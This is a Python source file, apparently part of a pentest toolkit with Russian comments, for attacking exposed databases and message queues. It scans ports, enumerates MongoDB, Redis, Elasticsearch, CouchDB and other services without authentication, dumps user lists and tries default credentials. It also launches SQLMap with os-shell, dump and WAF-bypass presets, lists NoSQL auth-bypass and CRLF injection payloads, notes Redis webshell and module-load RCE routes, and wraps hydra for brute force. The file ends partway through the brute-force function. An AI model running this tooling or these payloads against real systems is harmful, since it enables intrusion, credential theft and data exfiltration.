"""
Database Attack Helper — расширенный.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── NoSQL / Cache ───
    - MongoDB (27017/27018) — no-auth, list DBs/collections, users, indexes
    - Redis (6379/6380) — no-auth, INFO, keys, CONFIG, RCE vectors
    - Memcached (11211) — stats, items, keys dump
    - CouchDB (5984) — _all_dbs, _users, admin check
    - Cassandra (9042) — cqlsh keyspaces
    - Neo4j (7474/7687) — HTTP API, no-auth check
    - InfluxDB (8086) — /ping, /query
    - ClickHouse (8123/9000) — HTTP interface
    - RethinkDB (28015) — HTTP admin
    - ArangoDB (8529) — _api/version

    ─── Search / Logs ───
    - Elasticsearch (9200) — indices, search, snapshot
    - Kibana (5601) — /api/status
    - OpenSearch (9200)
    - Solr (8983) — admin/info

    ─── Message queues ───
    - RabbitMQ (5672/15672) — mgmt UI
    - Kafka (9092) — TCP check
    - ActiveMQ (61616/8161) — admin UI

    ─── SQL (brute-force wrappers) ───
    - MySQL/MariaDB (3306) — hydra
    - PostgreSQL (5432) — hydra
    - MSSQL (1433) — hydra
    - Oracle (1521) — hydra

    ─── Интеграция ───
    - SQLMap launcher (8 пресетов)
    - NoSQL injection payloads (расширенные)
    - Findings → notes
    - Notify
    - HTML / CSV / JSON / Markdown экспорт
"""
import csv
import html as html_mod
import json
import re
import shutil
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

import requests
from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn,
)

from core.config import config, REPORT_DIR
from core.database import db
from core.logger import get_logger
from utils.helpers import confirm_external, extract_host

console = Console()
log = get_logger(__name__)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_DIR = REPORT_DIR / "db_attack"
DB_DIR.mkdir(parents=True, exist_ok=True)

TIMEOUT = 8
MAX_WORKERS = 20


# ===========================================================================
# Порты
# ===========================================================================

DB_PORTS = {
    27017: "MongoDB", 27018: "MongoDB (shard)",
    6379: "Redis", 6380: "Redis (TLS)",
    9200: "Elasticsearch", 9300: "Elasticsearch (transport)",
    11211: "Memcached",
    5984: "CouchDB",
    9042: "Cassandra",
    3306: "MySQL/MariaDB",
    5432: "PostgreSQL",
    1433: "MSSQL",
    1521: "Oracle",
    5601: "Kibana",
    7474: "Neo4j (HTTP)", 7687: "Neo4j (Bolt)",
    8086: "InfluxDB",
    8123: "ClickHouse (HTTP)", 9000: "ClickHouse (native)",
    28015: "RethinkDB",
    8529: "ArangoDB",
    8983: "Solr",
    5672: "RabbitMQ (AMQP)", 15672: "RabbitMQ (mgmt)",
    9092: "Kafka",
    61616: "ActiveMQ", 8161: "ActiveMQ (mgmt)",
}


# ===========================================================================
# Модель
# ===========================================================================

@dataclass
class DBFinding:
    service: str
    target: str
    port: int
    severity: str           # critical | high | medium | low | info
    evidence: str = ""
    data: dict = field(default_factory=dict)
    error: str = ""
    remediation: str = ""


def _save_finding(f: DBFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f"{f.service} exposed: {f.target}",
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["db-attack", f.service.lower()],
            body=(f"**Service:** {f.service}\n"
                  f"**Target:** {f.target}\n"
                  f"**Port:** {f.port}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1500]}`\n\n"
                  f"**Remediation:** {f.remediation or '—'}"),
        )
    except Exception:
        return -1


# ===========================================================================
# MongoDB
# ===========================================================================

def check_mongodb(host: str, port: int = 27017) -> DBFinding | None:
    """MongoDB no-auth + DB/collection enumeration."""
    console.print(f"[cyan]🍃 MongoDB: {host}:{port}[/cyan]")
    # TCP check
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((host, port))
        s.close()
    except Exception:
        return None

    try:
        from pymongo import MongoClient
    except ImportError:
        console.print("[yellow]pymongo не установлен — только TCP.[/yellow]")
        return DBFinding(
            service="MongoDB", target=f"{host}:{port}", port=port,
            severity="medium",
            evidence="TCP порт открыт (pymongo не установлен)",
            remediation="Требуется pip install pymongo",
        )

    try:
        client = MongoClient(host, port, serverSelectionTimeoutMS=5000,
                             connectTimeoutMS=5000)
        info = client.admin.command("ismaster")
        dbs = client.list_database_names()
    except Exception as exc:
        err = str(exc)[:100]
        if "auth" in err.lower() or "unauthorized" in err.lower():
            return DBFinding(
                service="MongoDB", target=f"{host}:{port}", port=port,
                severity="info", evidence="требует auth", error=err,
            )
        return DBFinding(
            service="MongoDB", target=f"{host}:{port}", port=port,
            severity="info", evidence="TCP open, проверка не удалась",
            error=err,
        )

    f = DBFinding(
        service="MongoDB", target=f"{host}:{port}", port=port,
        severity="critical",
        evidence=f"no-auth! {len(dbs)} databases: {dbs[:5]}",
        data={"version": info.get("maxWireVersion"),
              "databases": dbs},
        remediation="Включить авторизацию: --auth + admin user",
    )

    # Enumerate collections in non-system DBs
    collections_info: dict = {}
    for db_name in dbs:
        if db_name in ("admin", "local", "config"):
            continue
        try:
            db_obj = client[db_name]
            colls = db_obj.list_collection_names()
            info_list = []
            for c_name in colls[:20]:
                try:
                    count = db_obj[c_name].estimated_document_count()
                    info_list.append({"name": c_name, "count": count})
                except Exception:
                    info_list.append({"name": c_name})
            collections_info[db_name] = info_list
        except Exception:
            pass
        if len(collections_info) >= 5:
            break

    f.data["collections"] = collections_info

    # Check for users (auth enabled but bypassable)
    try:
        users = list(client.admin.system.users.find({}))
        if users:
            f.data["users"] = [{"user": u.get("user"),
                                 "db": u.get("db")} for u in users[:20]]
    except Exception:
        pass

    client.close()
    _save_finding(f)
    return f


# ===========================================================================
# Redis
# ===========================================================================

def _redis_cmd(sock: socket.socket, *args) -> bytes:
    payload = f"*{len(args)}\r\n".encode()
    for a in args:
        a_b = a.encode() if isinstance(a, str) else a
        payload += f"${len(a_b)}\r\n".encode() + a_b + b"\r\n"
    sock.sendall(payload)
    sock.settimeout(2)
    resp = b""
    while True:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            resp += chunk
            if len(chunk) < 8192:
                break
        except socket.timeout:
            break
    return resp


def check_redis(host: str, port: int = 6379) -> DBFinding | None:
    """Redis no-auth + INFO + keys + CONFIG + RCE vectors."""
    console.print(f"[cyan]🔴 Redis: {host}:{port}[/cyan]")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((host, port))

        pong = _redis_cmd(s, "PING")
        if b"NOAUTH" in pong.upper():
            s.close()
            return DBFinding(
                service="Redis", target=f"{host}:{port}", port=port,
                severity="info", evidence="NOAUTH required",
            )
        if b"PONG" not in pong:
            s.close()
            return None

        # INFO
        info_raw = _redis_cmd(s, "INFO")
        info_str = info_raw.decode(errors="ignore")
        version = os_str = ""
        uptime = keyspace_hits = ""
        for line in info_str.split("\n"):
            if line.startswith("redis_version:"):
                version = line.split(":", 1)[1].strip()
            elif line.startswith("os:"):
                os_str = line.split(":", 1)[1].strip()
            elif line.startswith("uptime_in_days:"):
                uptime = line.split(":", 1)[1].strip()
            elif line.startswith("keyspace_hits:"):
                keyspace_hits = line.split(":", 1)[1].strip()

        # KEYS *
        keys_raw = _redis_cmd(s, "KEYS", "*")
        keys = re.findall(rb"\$[0-9]+\r\n([^\r]+)", keys_raw)
        keys = [k.decode(errors="ignore") for k in keys[:50]]

        # CONFIG GET (dir, dbfilename)
        config_dir = ""
        try:
            c1 = _redis_cmd(s, "CONFIG", "GET", "dir")
            m = re.search(rb"\$[0-9]+\r\n([^\r]+)", c1)
            if m:
                config_dir = m.group(1).decode(errors="ignore")
        except Exception:
            pass

        # MODULE LIST (RCE vector)
        module_list = ""
        try:
            ml = _redis_cmd(s, "MODULE", "LIST")
            if b"module" in ml.lower():
                module_list = ml[:300].decode(errors="ignore")
        except Exception:
            pass

        s.close()

        f = DBFinding(
            service="Redis", target=f"{host}:{port}", port=port,
            severity="critical",
            evidence=(f"no-auth! v{version}, "
                      f"{len(keys)} keys, dir={config_dir}"),
            data={"version": version, "os": os_str, "uptime_days": uptime,
                  "keyspace_hits": keyspace_hits,
                  "config_dir": config_dir,
                  "sample_keys": keys[:20],
                  "module_list": module_list[:200]},
            remediation=("Установить requirepass + bind 127.0.0.1, "
                         "переименовать CONFIG/EVAL/MODULE"),
        )

        # Extra: RCE indicators
        rce_vectors = []
        if config_dir:
            rce_vectors.append(f"CONFIG SET dir {config_dir} + "
                                f"CONFIG SET dbfilename → write webshell")
        if "module" in module_list.lower():
            rce_vectors.append("MODULE LOAD → RCE через .so модуль")
        f.data["rce_vectors"] = rce_vectors
        _save_finding(f)
        return f
    except Exception as exc:
        log.debug("redis %s: %s", host, exc)
        return None


# ===========================================================================
# Elasticsearch
# ===========================================================================

def check_elasticsearch(host: str, port: int = 9200) -> DBFinding | None:
    """Elasticsearch no-auth + indices + search + snapshot."""
    console.print(f"[cyan]🟡 Elasticsearch: {host}:{port}[/cyan]")
    for scheme in ("http", "https"):
        try:
            r = requests.get(f"{scheme}://{host}:{port}/",
                             timeout=TIMEOUT, verify=False,
                             headers={"User-Agent": config.USER_AGENT})
            if r.status_code != 200:
                continue
            data = r.json()
            if "version" not in data:
                continue

            version = data.get("version", {}).get("number", "?")
            cluster_name = data.get("cluster_name", "?")

            # Indices
            indices: list[str] = []
            doc_counts: dict = {}
            try:
                idx_r = requests.get(
                    f"{scheme}://{host}:{port}/_cat/indices?format=json",
                    timeout=TIMEOUT, verify=False)
                if idx_r.status_code == 200:
                    for i in idx_r.json()[:50]:
                        name = i.get("index", "")
                        indices.append(name)
                        doc_counts[name] = i.get("docs.count", "?")
            except Exception:
                pass

            # Search test
            searchable = False
            try:
                sr = requests.get(
                    f"{scheme}://{host}:{port}/_search?size=1",
                    timeout=TIMEOUT, verify=False)
                searchable = sr.status_code == 200
            except Exception:
                pass

            # Nodes
            nodes_count = "?"
            try:
                nr = requests.get(f"{scheme}://{host}:{port}/_cluster/health",
                                   timeout=TIMEOUT, verify=False)
                if nr.status_code == 200:
                    nodes_count = nr.json().get("number_of_nodes", "?")
            except Exception:
                pass

            # Snapshot repositories
            snapshot_repos: list[str] = []
            try:
                sr2 = requests.get(
                    f"{scheme}://{host}:{port}/_snapshot/_all",
                    timeout=TIMEOUT, verify=False)
                if sr2.status_code == 200:
                    snapshot_repos = list(sr2.json().keys())[:20]
            except Exception:
                pass

            f = DBFinding(
                service="Elasticsearch",
                target=f"{host}:{port}", port=port,
                severity="critical" if indices else "high",
                evidence=(f"no-auth! v{version}, cluster={cluster_name}, "
                          f"{len(indices)} indices, "
                          f"search={'OK' if searchable else 'no'}, "
                          f"nodes={nodes_count}"),
                data={"version": version, "cluster_name": cluster_name,
                      "indices": indices, "doc_counts": doc_counts,
                      "searchable": searchable,
                      "nodes_count": nodes_count,
                      "snapshot_repos": snapshot_repos},
                remediation="Включить X-Pack Security / OpenSearch Security",
            )
            _save_finding(f)
            return f
        except Exception:
            continue
    return None


# ===========================================================================
# Memcached
# ===========================================================================

def check_memcached(host: str, port: int = 11211) -> DBFinding | None:
    """Memcached stats + items dump."""
    console.print(f"[cyan]⚪ Memcached: {host}:{port}[/cyan]")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((host, port))
        s.sendall(b"stats\r\n")
        resp = b""
        while b"END" not in resp and len(resp) < 65536:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk

        if b"STAT" not in resp:
            s.close()
            return None

        stats: dict[str, str] = {}
        for line in resp.decode(errors="ignore").split("\r\n"):
            m = re.match(r"STAT (\S+) (.+)", line)
            if m:
                stats[m.group(1)] = m.group(2)

        # Items
        try:
            s.sendall(b"stats items\r\n")
            items_resp = b""
            s.settimeout(3)
            try:
                items_resp = s.recv(8192)
            except Exception:
                pass
        except Exception:
            items_resp = b""

        s.close()

        has_items = b"STAT items" in items_resp
        sev = "critical" if has_items else "high"

        f = DBFinding(
            service="Memcached", target=f"{host}:{port}", port=port,
            severity=sev,
            evidence=(f"no-auth! v{stats.get('version', '?')}, "
                      f"curr_items={stats.get('curr_items', '0')}, "
                      f"curr_connections={stats.get('curr_connections', '?')}, "
                      f"uptime={stats.get('uptime', '?')}s"),
            data={
                "version": stats.get("version"),
                "curr_items": stats.get("curr_items"),
                "total_items": stats.get("total_items"),
                "bytes": stats.get("bytes"),
                "curr_connections": stats.get("curr_connections"),
                "total_connections": stats.get("total_connections"),
                "uptime": stats.get("uptime"),
                "has_items": has_items,
            },
            remediation="bind 127.0.0.1 + SASL auth",
        )
        _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# CouchDB
# ===========================================================================

def check_couchdb(host: str, port: int = 5984) -> DBFinding | None:
    console.print(f"[cyan]🟠 CouchDB: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/",
                         timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": config.USER_AGENT})
        if r.status_code != 200:
            return None
        try:
            data = r.json()
        except Exception:
            return None
        if "couchdb" not in data and "version" not in data:
            return None

        dbs: list[str] = []
        try:
            dbs_r = requests.get(f"http://{host}:{port}/_all_dbs",
                                  timeout=TIMEOUT, verify=False)
            if dbs_r.status_code == 200:
                dbs = dbs_r.json()[:30]
        except Exception:
            pass

        # _users (critical)
        users_accessible = False
        users_data = {}
        try:
            users_r = requests.get(
                f"http://{host}:{port}/_users/_all_docs",
                timeout=TIMEOUT, verify=False)
            if users_r.status_code == 200:
                users_accessible = True
                users_data = users_r.json()
        except Exception:
            pass

        sev = "critical" if users_accessible else "high"
        f = DBFinding(
            service="CouchDB", target=f"{host}:{port}", port=port,
            severity=sev,
            evidence=(f"no-auth! v{data.get('version', '?')}, "
                      f"{len(dbs)} dbs, "
                      f"_users={'accessible' if users_accessible else 'no'}"),
            data={"version": data.get("version"),
                  "databases": dbs,
                  "users_accessible": users_accessible},
            remediation="Установить admin: [admins] в local.ini",
        )
        _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# Cassandra
# ===========================================================================

def check_cassandra(host: str, port: int = 9042) -> DBFinding | None:
    console.print(f"[cyan]🔵 Cassandra: {host}:{port}[/cyan]")
    if not shutil.which("cqlsh"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.close()
            return DBFinding(
                service="Cassandra", target=f"{host}:{port}", port=port,
                severity="medium",
                evidence="TCP открыт (cqlsh не установлен)",
                remediation="Требуется cqlsh",
            )
        except Exception:
            return None

    try:
        out = subprocess.check_output(
            ["cqlsh", host, str(port), "-e", "describe keyspaces;"],
            encoding="utf-8", errors="ignore", timeout=15,
            stderr=subprocess.STDOUT)
        if "system" in out and "Error" not in out[:200]:
            keyspaces = [k for k in re.findall(r"^\s*(\w+)", out,
                                                 re.MULTILINE)
                          if not k.startswith("cqlsh")]
            f = DBFinding(
                service="Cassandra", target=f"{host}:{port}", port=port,
                severity="critical",
                evidence=f"no-auth! keyspaces={keyspaces[:10]}",
                data={"keyspaces": keyspaces[:30]},
                remediation="Включить PasswordAuthenticator",
            )
            _save_finding(f)
            return f
    except Exception:
        pass
    return None


# ===========================================================================
# Neo4j (HTTP API)
# ===========================================================================

def check_neo4j(host: str, port: int = 7474) -> DBFinding | None:
    console.print(f"[cyan]🔵 Neo4j: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/",
                         timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": config.USER_AGENT})
        if r.status_code != 200:
            return None
        if "neo4j" not in r.text.lower() and "neo4j" not in str(r.headers):
            return None

        # Try default creds
        default_creds = [("neo4j", "neo4j"), ("neo4j", "password"),
                          ("neo4j", "admin")]
        auth_ok = None
        for user, pwd in default_creds:
            try:
                r2 = requests.get(
                    f"http://{host}:{port}/user/neo4j",
                    auth=(user, pwd), timeout=TIMEOUT, verify=False)
                if r2.status_code == 200:
                    auth_ok = (user, pwd)
                    break
            except Exception:
                pass

        sev = "critical" if auth_ok else "medium"
        evidence = "Neo4j HTTP доступен"
        if auth_ok:
            evidence += f", default creds {auth_ok}!"
        f = DBFinding(
            service="Neo4j", target=f"{host}:{port}", port=port,
            severity=sev, evidence=evidence,
            data={"default_creds": auth_ok},
            remediation="Сменить default пароль + firewall",
        )
        if auth_ok:
            _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# InfluxDB
# ===========================================================================

def check_influxdb(host: str, port: int = 8086) -> DBFinding | None:
    console.print(f"[cyan]🔵 InfluxDB: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/ping",
                         timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": config.USER_AGENT})
        if r.status_code != 204 and r.status_code != 200:
            return None

        # Query endpoint
        queries = ["SHOW DATABASES", "SHOW MEASUREMENTS",
                    "SHOW USERS"]
        results = {}
        for q in queries:
            try:
                r2 = requests.get(f"http://{host}:{port}/query",
                                   params={"q": q},
                                   timeout=TIMEOUT, verify=False)
                if r2.status_code == 200:
                    results[q] = r2.text[:500]
            except Exception:
                pass

        sev = "critical" if any("results" in v for v in results.values()) \
              else "medium"
        f = DBFinding(
            service="InfluxDB", target=f"{host}:{port}", port=port,
            severity=sev,
            evidence=f"no-auth! queries: {list(results.keys())}",
            data=results,
            remediation="Включить auth-enabled = true в influxdb.conf",
        )
        if sev == "critical":
            _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# ClickHouse
# ===========================================================================

def check_clickhouse(host: str, port: int = 8123) -> DBFinding | None:
    console.print(f"[cyan]🔵 ClickHouse: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/ping",
                         timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": config.USER_AGENT})
        if r.status_code != 200 or "Ok" not in r.text:
            return None

        # Query databases
        q = "SHOW DATABASES"
        r2 = requests.post(f"http://{host}:{port}/?query={q}",
                            timeout=TIMEOUT, verify=False)
        dbs = []
        if r2.status_code == 200:
            dbs = r2.text.strip().split("\n")[:20]

        f = DBFinding(
            service="ClickHouse", target=f"{host}:{port}", port=port,
            severity="critical" if dbs else "medium",
            evidence=f"no-auth! databases={dbs[:10]}",
            data={"databases": dbs},
            remediation="Включить users.xml passwords + firewall",
        )
        if dbs:
            _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# ArangoDB
# ===========================================================================

def check_arangodb(host: str, port: int = 8529) -> DBFinding | None:
    console.print(f"[cyan]🔵 ArangoDB: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/_api/version",
                         timeout=TIMEOUT, verify=False)
        if r.status_code != 200:
            return None
        try:
            data = r.json()
        except Exception:
            return None
        if "version" not in data:
            return None

        # Try no-auth DB list
        dbs: list[str] = []
        try:
            r2 = requests.get(f"http://{host}:{port}/_api/database/user",
                               timeout=TIMEOUT, verify=False)
            if r2.status_code == 200:
                dbs = r2.json().get("result", [])[:20]
        except Exception:
            pass

        f = DBFinding(
            service="ArangoDB", target=f"{host}:{port}", port=port,
            severity="critical" if dbs else "medium",
            evidence=f"v{data.get('version', '?')}, "
                     f"no-auth dbs={dbs[:5]}",
            data={"version": data.get("version"), "databases": dbs},
        )
        if dbs:
            _save_finding(f)
        return f
    except Exception:
        return None


# ===========================================================================
# Solr
# ===========================================================================

def check_solr(host: str, port: int = 8983) -> DBFinding | None:
    console.print(f"[cyan]🔵 Solr: {host}:{port}[/cyan]")
    try:
        r = requests.get(f"http://{host}:{port}/solr/admin/info/system",
                         timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": config.USER_AGENT})
        if r.status_code != 200:
            return None

        # Cores
        cores: list[str] = []
        try:
            r2 = requests.get(f"http://{host}:{port}/solr/admin/cores",
                               timeout=TIMEOUT, verify=False)
            if r2.status_code == 200:
                status = r2.json().get("status", {})
                cores = list(status.keys())[:20]
        except Exception:
            pass

        f = DBFinding(
            service="Solr", target=f"{host}:{port}", port=port,
            severity="high" if cores else "medium",
            evidence=f"admin доступен, cores={cores[:5]}",
            data={"cores": cores},
            remediation="Включить authentication + firewall",
        )
        return f
    except Exception:
        return None


# ===========================================================================
# RabbitMQ mgmt
# ===========================================================================

def check_rabbitmq(host: str, port: int = 15672) -> DBFinding | None:
    console.print(f"[cyan]🔵 RabbitMQ mgmt: {host}:{port}[/cyan]")
    try:
        # Default creds
        creds = [("guest", "guest"), ("admin", "admin"),
                  ("guest", "password")]
        ok = None
        for u, p in creds:
            try:
                r = requests.get(f"http://{host}:{port}/api/overview",
                                  auth=(u, p), timeout=TIMEOUT, verify=False)
                if r.status_code == 200:
                    ok = (u, p)
                    break
            except Exception:
                pass

        if ok:
            f = DBFinding(
                service="RabbitMQ", target=f"{host}:{port}", port=port,
                severity="critical",
                evidence=f"default creds {ok} на mgmt API",
                data={"creds": ok},
                remediation="Удалить guest/сменить пароль",
            )
            _save_finding(f)
            return f
        return DBFinding(
            service="RabbitMQ", target=f"{host}:{port}", port=port,
            severity="low", evidence="mgmt доступен (creds не подошли)",
        )
    except Exception:
        return None


# ===========================================================================
# Порт-скан
# ===========================================================================

def _port_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def scan_host(host: str, threads: int = MAX_WORKERS,
               save_findings: bool = True) -> list[DBFinding]:
    """Полный скан хоста по всем DB-портам."""
    if not confirm_external(host):
        return []
    host = extract_host(host)
    console.print(f"[cyan]🔍 DB scan: {host} ({len(DB_PORTS)} портов)[/cyan]")

    findings: list[DBFinding] = []

    open_ports: list[int] = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_port_open, host, pt): pt for pt in DB_PORTS}
        for f in as_completed(futs):
            if f.result():
                open_ports.append(futs[f])

    if not open_ports:
        console.print("[green]Открытых DB-портов нет.[/green]")
        return []

    console.print(f"[yellow]Открыто: {sorted(open_ports)}[/yellow]\n")

    checks = {
        27017: check_mongodb, 27018: check_mongodb,
        6379: check_redis, 6380: check_redis,
        9200: check_elasticsearch, 9300: check_elasticsearch,
        11211: check_memcached,
        5984: check_couchdb,
        9042: check_cassandra,
        7474: check_neo4j,
        8086: check_influxdb,
        8123: check_clickhouse,
        8529: check_arangodb,
        8983: check_solr,
        15672: check_rabbitmq,
    }

    with Progress(SpinnerColumn(),
                  TextColumn("[progress.description]{task.description}"),
                  BarColumn(),
                  TextColumn("{task.completed}/{task.total}"),
                  TimeElapsedColumn(),
                  console=console) as p:
        task = p.add_task("checks", total=len(open_ports))
        with ThreadPoolExecutor(max_workers=min(threads, 10)) as ex:
            futs = {}
            for pt in open_ports:
                fn = checks.get(pt)
                if fn:
                    futs[ex.submit(fn, host, pt)] = pt
                else:
                    findings.append(DBFinding(
                        service=DB_PORTS.get(pt, "unknown"),
                        target=f"{host}:{pt}", port=pt,
                        severity="info",
                        evidence="порт открыт (нет авто-проверки)",
                    ))
            for f in as_completed(futs):
                p.advance(task)
                try:
                    r = f.result()
                    if r:
                        findings.append(r)
                except Exception as exc:
                    log.warning("check %s: %s", futs[f], exc)

    _print_summary(findings, host)

    # Findings → notes
    if save_findings:
        saved = sum(1 for r in findings if _save_finding(r) > 0)
        if saved:
            console.print(f"[green]✓ Findings в notes: {saved}[/green]")

    # Notify
    if findings:
        try:
            from modules import notifier
            crit = sum(1 for f in findings if f.severity == "critical")
            high = sum(1 for f in findings if f.severity == "high")
            if crit or high:
                notifier.notify_all(
                    f"🗄  DB Scan: {host}",
                    f"Critical: {crit}\nHigh: {high}\nTotal: {len(findings)}")
        except Exception:
            pass

    db.save_scan("db_scan", host, {
        "open_ports": sorted(open_ports),
        "findings": [asdict(f) for f in findings],
    })
    return findings


# ===========================================================================
# Печать
# ===========================================================================

def _sev_style(sev: str) -> str:
    return {
        "critical": "bold red", "high": "red",
        "medium": "yellow", "low": "green", "info": "dim",
    }.get(sev, "white")


def _print_finding(f: DBFinding) -> None:
    sty = _sev_style(f.severity)
    console.print(f"[{sty}]●[/{sty}] [cyan]{f.service}[/cyan] "
                  f"@ [green]{f.target}[/green] "
                  f"[{sty}]({f.severity.upper()})[/{sty}]")
    if f.evidence:
        console.print(f"   [dim]{f.evidence}[/dim]")


def _print_summary(findings: list[DBFinding], host: str) -> None:
    if not findings:
        console.print(f"\n[green]✓ Ничего критичного.[/green]")
        return
    t = Table(title=f"🗄  DB findings — {host} ({len(findings)})")
    t.add_column("#", style="yellow", width=4)
    t.add_column("Sev", width=10)
    t.add_column("Service", style="cyan", max_width=20)
    t.add_column("Target", style="green")
    t.add_column("Evidence", style="white", max_width=55)
    for i, f in enumerate(
        sorted(findings,
               key=lambda x: {"critical": 0, "high": 1, "medium": 2,
                              "low": 3, "info": 4}.get(x.severity, 5)), 1):
        sty = _sev_style(f.severity)
        t.add_row(str(i), f"[{sty}]{f.severity.upper()}[/{sty}]",
                  f.service, f.target, f.evidence[:55])
    console.print(t)


# ===========================================================================
# SQLMap
# ===========================================================================

SQLMAP_PRESETS = {
    "quick": ["-u", "{url}", "--batch", "--smart"],
    "full": ["-u", "{url}", "--batch", "--level=5", "--risk=3",
             "--random-agent", "--threads=5"],
    "post": ["-u", "{url}", "--batch", "--data={data}",
             "--level=3", "--risk=2"],
    "cookie": ["-u", "{url}", "--batch", "--cookie={cookie}",
               "--level=3", "--risk=2"],
    "dump": ["-u", "{url}", "--batch", "--dbs", "--dump"],
    "os-shell": ["-u", "{url}", "--batch", "--os-shell"],
    "tamper": ["-u", "{url}", "--batch",
               "--tamper=space2comment,between,randomcase"],
    "waf-bypass": ["-u", "{url}", "--batch", "--random-agent",
                   "--tamper=charencode,space2comment,equaltolike,"
                   "modsecurityversioned", "--delay=1"],
    "json-api": ["-u", "{url}", "--batch", "--data={data}",
                 "--headers=Content-Type: application/json",
                 "--level=3", "--risk=2"],
}


def sqlmap_launch(url: str, preset: str = "quick",
                   data: str = "", cookie: str = "",
                   extra: str = "") -> None:
    if not shutil.which("sqlmap"):
        console.print("[red]sqlmap не установлен.[/red]")
        console.print("[yellow]git clone "
                      "https://github.com/sqlmapproject/sqlmap[/yellow]")
        return
    if not confirm_external(url):
        return
    if preset not in SQLMAP_PRESETS:
        console.print(f"[red]Неизвестный пресет: {preset}[/red]")
        return

    cmd = ["sqlmap"]
    for part in SQLMAP_PRESETS[preset]:
        cmd.append(part.format(url=url, data=data, cookie=cookie))
    if extra:
        cmd.extend(extra.split())

    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    try:
        subprocess.run(cmd, check=False)
        db.save_scan("sqlmap", url, {"preset": preset})
    except KeyboardInterrupt:
        console.print("\n[yellow]Прервано.[/yellow]")
    except Exception as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")


# ===========================================================================
# NoSQL payloads (расширенные)
# ===========================================================================

NOSQL_PAYLOADS = {
    "mongodb_auth_bypass": [
        '{"$ne": null}', '{"$ne": ""}', '{"$gt": ""}',
        '{"$regex": "^.*$"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"username": "admin", "password": {"$ne": 1}}',
        '{"$where": "sleep(5000)"}',
        '{"$where": "this.password.match(/^a/)"}',
        '{"username": {"$in": ["admin"]}, "password": {"$ne": null}}',
    ],
    "mongodb_url_injection": [
        "?username[$ne]=null&password[$ne]=null",
        "?username[$gt]=&password[$gt]=",
        "?username[$regex]=^admin&password[$regex]=^.*",
        "?id[$ne]=1",
        "?user[$nin][]=admin&user[$nin][]=root",
    ],
    "redis_injection": [
        "\r\nINFO\r\n",
        "\r\nCONFIG GET *\r\n",
        "\r\nKEYS *\r\n",
    ],
    "elasticsearch_injection": [
        '{"query": {"wildcard": {"user": "*"}}}',
        '{"query": {"regexp": {"password": ".*"}}}',
        '{"query": {"bool": {"must": [{"match_all": {}}]}}}',
    ],
    "neo4j_injection": [
        "' OR 1=1 //",
        "' UNION MATCH (n) RETURN n //",
    ],
}


def show_nosql_payloads(db_type: str = "mongodb_auth_bypass") -> None:
    payloads = NOSQL_PAYLOADS.get(db_type)
    if not payloads:
        console.print(f"[red]Нет payloads для {db_type}[/red]")
        console.print(f"[dim]Доступно: {', '.join(NOSQL_PAYLOADS)}[/dim]")
        return
    t = Table(title=f"💉 NoSQL payloads: {db_type}")
    t.add_column("#", style="yellow", width=4)
    t.add_column("Payload", style="green")
    for i, p in enumerate(payloads, 1):
        t.add_row(str(i), p)


# ===========================================================================
# Brute-force
# ===========================================================================

def brute_force(service: str, target: str, userlist: str,
                 passlist: str, port: int = 0) -> None:
    if not shutil.which("hydra"):
        console.print("[red]hydra не установлен.[/red]")
        return
    if not confirm_external(target):
        return

    svc_map = {
        "mysql":    ("mysql", 3306),
        "mssql":    ("mssql", 1433),
        "postgres": ("postgres", 5432),
        "oracle":   ("oracle-listener", 1521),
        "mongodb":  ("mongodb", 27017),
        "redis":    ("redis", 6379),
        "ssh":      ("ssh", 22),
    }
    if service not in svc_map:
        console.print(f"[red]Service: {list(svc_map.keys())}[/red]")
        return
    hydra_svc, default_port = svc_map[service]
    port = port or default_port

    out_file = DB_DIR / f"hydra_{service}_{target}.txt"
    cmd = ["hydra", "-L", userlist, "-P", passlist,
           "-t", "4", "-f", "-o", str(out_file),
           f"{hydra_svc}://{target}:{port}"]
